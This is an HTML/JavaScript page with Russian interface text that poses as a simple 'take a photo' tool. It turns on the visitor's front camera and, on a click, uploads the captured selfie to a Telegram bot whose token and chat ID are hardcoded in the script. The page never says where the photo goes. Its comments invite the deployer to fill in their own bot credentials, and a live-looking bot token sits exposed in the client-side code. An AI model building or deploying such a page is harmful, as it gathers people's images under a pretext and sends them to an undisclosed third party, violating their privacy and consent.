<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 Сделай фото</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #0a0a15;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 16px;
            background: #000;
            border: 2px solid #2a4a6a;
            margin-bottom: 20px;
            transform: scaleX(-1);
        }
        button {
            background: #2a6a9a;
            color: white;
            border: none;
            padding: 16px 40px;
            border-radius: 12px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background: #4a8aba; }
        button:active { transform: scale(0.95); }
        #status {
            margin-top: 20px;
            padding: 12px 20px;
            border-radius: 8px;
            background: #1a1a2a;
            text-align: center;
            min-width: 200px;
        }
        .loading { color: #f0c040; }
        .success { color: #4aba4a; }
        .error { color: #ba4a4a; }
    </style>
</head>
<body>
    <h1>📸 Сделай фото</h1>
    <video id="video" autoplay playsinline></video>
    <button id="captureBtn">📷 Сделать фото</button>
    <div id="status">⏳ Ожидание...</div>

    <script>
        // ===== НАСТРОЙКИ =====
        // Сюда вставьте ваш ТОКЕН от бота и ваш CHAT_ID
        const BOT_TOKEN = "8958397062:AAHkrvNYPFmaE34mcNk8kdnp86kGOODaxNE";  // ← ЗАМЕНИТЕ!
        const CHAT_ID = "8051129916";                              // ← ЗАМЕНИТЕ!
        // =====================

        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');

        let stream = null;

        // Запрашиваем доступ к камере
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 } }
                });
                video.srcObject = stream;
                statusDiv.textContent = '✅ Камера готова!';
                statusDiv.className = 'success';
                captureBtn.disabled = false;
            } catch (err) {
                statusDiv.textContent = '❌ Ошибка доступа к камере: ' + err.message;
                statusDiv.className = 'error';
            }
        }

        // Отправка фото в Telegram
        async function sendPhotoToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'photo.jpg');

            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                    { method: 'POST', body: formData }
                );
                const result = await response.json();
                if (result.ok) {
                    statusDiv.textContent = '✅ Фото отправлено!';
                    statusDiv.className = 'success';
                } else {
                    statusDiv.textContent = '❌ Ошибка отправки: ' + result.description;
                    statusDiv.className = 'error';
                }
            } catch (err) {
                statusDiv.textContent = '❌ Ошибка: ' + err.message;
                statusDiv.className = 'error';
            }
        }

        // Делаем фото
        async function capturePhoto() {
            statusDiv.textContent = '📸 Снимаю...';
            statusDiv.className = 'loading';
            captureBtn.disabled = true;

            try {
                // Создаём canvas с зеркальным отображением
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                // Отражаем по горизонтали (селфи-эффект)
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Конвертируем в JPEG
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

                // Отправляем в Telegram
                await sendPhotoToTelegram(blob);

            } catch (err) {
                statusDiv.textContent = '❌ Ошибка: ' + err.message;
                statusDiv.className = 'error';
            }

            captureBtn.disabled = false;
        }

        // Запуск
        startCamera();
        captureBtn.addEventListener('click', capturePhoto);

        // Остановка камеры при уходе со страницы
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
        });
    </script>
</body>
</html>
